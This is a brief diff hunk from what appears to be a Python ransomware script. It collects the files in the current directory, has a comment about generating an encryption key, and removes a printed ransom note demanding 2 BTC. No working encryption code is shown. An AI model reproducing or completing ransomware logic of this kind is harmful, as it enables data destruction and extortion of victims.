@@ -14,7 +14,7 @@ for file in os.listdir():
         if os.path.isfile(file):
                 files.append(file)
 
-print("You have been hacked, all documents have been encrypted! In order to recover you information you must send 2BTC to the following address 8675309")
+
 
 #generating encryption key
 
